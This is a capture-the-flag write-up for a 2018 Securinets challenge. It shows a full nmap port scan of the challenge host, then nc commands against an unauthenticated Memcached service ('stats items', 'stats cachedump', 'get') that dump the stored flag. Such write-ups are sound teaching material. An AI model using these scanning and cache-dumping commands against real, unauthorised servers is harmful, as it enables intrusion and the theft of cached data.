Service Hidden in the bush
--------------------------
> The Emperors wanted to hide their secret in a location where they can read it quickly,
> But they don't know anything about Security. Try to expose it: net1.quals18.ctfsecurinets.com

First, `nmap` the host to see what services are running
```console
$ nmap -vvvv -Pn net1.quals18.ctfsecurinets.com -p1-65535 -sT                                                                                                                                               master 130

Starting Nmap 6.40 ( http://nmap.org ) at 2018-03-25 18:52 CEST
Initiating Parallel DNS resolution of 1 host. at 18:52
Completed Parallel DNS resolution of 1 host. at 18:52, 6.53s elapsed
DNS resolution of 1 IPs took 6.53s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 18:52
Scanning net1.quals18.ctfsecurinets.com (34.245.183.111) [65535 ports]
Discovered open port 22/tcp on 34.245.183.111
Connect Scan Timing: About 17.68% done; ETC: 18:55 (0:02:24 remaining)
Connect Scan Timing: About 38.88% done; ETC: 18:55 (0:01:36 remaining)
Discovered open port 11211/tcp on 34.245.183.111
Connect Scan Timing: About 62.37% done; ETC: 18:55 (0:00:55 remaining)
Completed Connect Scan at 18:55, 159.85s elapsed (65535 total ports)
Nmap scan report for net1.quals18.ctfsecurinets.com (34.245.183.111)
Host is up (0.050s latency).
rDNS record for 34.245.183.111: ec2-34-245-183-111.eu-west-1.compute.amazonaws.com
Scanned at 2018-03-25 18:52:39 CEST for 159s
Not shown: 65533 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
11211/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 166.45 seconds
```

What's on port 11211? [Memcached](https://www.speedguide.net/port.php?port=11211)!

Using some [help from StackOverflow](https://stackoverflow.com/questions/19560150/get-all-keys-set-in-memcached) and a [Memcached telnet command list](https://blog.elijaa.org/2010/05/21/memcached-telnet-command-summary/#get), we can then:

```console
$ nc net1.quals18.ctfsecurinets.com  11211
stats items
STAT items:1:number 1
STAT items:1:age 0
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 83171
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
END
stats cachedump 1 100
ITEM flag [23 b; 1521998034 s]
END
get flag
VALUE flag 0 23
Flag{M3mc4cH3d_3xp0s3d}
END
```

```

```
